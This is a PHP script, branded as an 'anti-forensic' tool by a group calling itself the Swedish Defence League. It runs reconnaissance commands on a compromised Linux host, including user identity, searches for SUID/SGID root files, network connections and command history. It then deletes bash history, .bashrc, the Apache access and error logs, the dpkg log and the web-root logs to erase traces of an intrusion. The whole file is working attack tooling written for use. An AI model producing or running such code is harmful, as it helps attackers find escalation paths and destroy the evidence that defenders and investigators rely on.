<?php
echo "   _______________
        /               \
       /                 \
      /                   \
      |   XXXX     XXXX   |
      |   XXXX     XXXX   |
      |   XXX       XXX   |
      |         X         |
      \__      XXX     __/
        |\     XXX     /|
        | |           | |
        | I I I I I I I |
        |  I I I I I I  |
         \_           _/
          \_         _/
            \_______/

             SDL ANTI-FORENSIK AIE - SER >VI< DÖDA UT? :0000 - Paddox - SDL - Swedish Defence League \n";
echo "Looking up kernel and Distro\n";
sleep(3);

system("cat /proc/cpuinfo");
/*NOTE: if you want less amount of info replace with uname -a instead

*/

echo "__________________END________________________\n";

echo "List files with permissions\n";
sleep(3);
system("ls -ail");

echo "__________________END________________________\n";

echo "ID\n";

sleep(3);
system("id");

echo "__________________END________________________\n";

echo "Finding suid files\n";

system("find / -user root -perm -4000 -print");
sleep(3);

echo "__________________END________________________\n";

echo "Find SGID files\n";

sleep(3);
system("find / -group root -perm -2000 -print");

echo "__________________END________________________\n";

echo "Find Symlinks";
sleep(3);
system("find / -type l -ls");
echo "__________________END________________________\n";
echo "Check for cpu and processing units\n";
sleep(3);
system("lscpu");

echo "__________________END________________________\n";

echo "List Blockdevices\n";
sleep(3);
system("lsblk");
echo "__________________END________________________\n";
echo "Filsystem\n";
sleep(3);
system("mount | column -t");
echo "__________________END________________________\n";
echo "Vem är inloggad på boxen\n";
sleep(3);
system("who");
echo "__________________END________________________\n";
echo "Kollar anslutningar";
sleep(3);
system("netstat -an");
echo "__________________END________________________\n";

echo "Decrypt this: Cgorkmu.ybq\n";
echo "Hint: Shift value is: 10\n";
echo sleep(3);
echo "_________________END__________________________\n";

echo "Kommando historian";
sleep(3);
system("history");
echo "__________________END________________________\n";

echo "NU SKA VI SPOLA LITE LOGGAR\n";
sleep(3);
echo "spolningsvätska V.2\n";
sleep(3);


system('clear');
echo "Run with root permissions\n";
echo "Please be advised to use this with caution as this can harm youre \n system.";
echo "This script is for default files, youre B0X may contatin different locations\n or whatsoever, edit the php file with youre log path!\n";
sleep(5);
echo  "Deleting /tmp/logs\n";

$logone = exec("sudo rm -r --preserve-root /tmp/logs"); // This is mostly what has been added to youre temporary files

echo  "Deleting  .Bash_history\n";

$logtwo = exec("sudo rm -r --preserve-root /home/napoleon/.bash_history"); // Deletes the bash_history example of what commands you have inputted during youre linux session
sleep(3);
echo "Deletin .Bashrc\n";
sleep(2);
$logthree = exec("rm -r --preserve-root /home/napoleon/.bashrc");
sleep(2);
echo "Deleting access logs\n";
sleep(2);
$logfour = exec("rm -r --preserve-root /var/log/apache2/access.log");
sleep(2);
echo "Deleting error.log\n";
sleep(2);
$logfive = exec("rm -r --preserve-root /var/log/apache2/error.log");
sleep(2);
echo "Deleting DPKG logs\n";
sleep(2);
$logsix = exec("rm -r --preserve-root /var/log/dpkg.log\n");
sleep(2);
echo "Deleting all logs in /var/www/ to ensure guaranteed removal.\n";
sleep(2);
$logseven = exec("rm -r --preserve-root /var/www/*.log");
echo "Greets from Paddox - Swedish Defence League\n";




?>
